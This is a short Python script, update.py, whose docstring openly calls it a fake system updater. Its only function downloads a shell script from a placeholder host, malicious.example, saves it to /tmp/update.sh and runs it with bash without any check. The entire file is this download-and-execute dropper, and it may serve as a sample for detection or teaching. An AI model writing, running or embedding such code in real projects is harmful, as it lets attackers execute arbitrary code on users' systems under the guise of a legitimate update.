"""
update.py
Pretends to be a system updater but downloads & executes remote content
"""

import os
import subprocess
import requests

URL = "http://malicious.example/payload.sh"

def run():
    r = requests.get(URL, timeout=5)
    if r.status_code == 200:
        with open("/tmp/update.sh", "w") as f:
            f.write(r.text)
        subprocess.call(["/bin/bash", "/tmp/update.sh"])

if __name__ == "__main__":
    run()
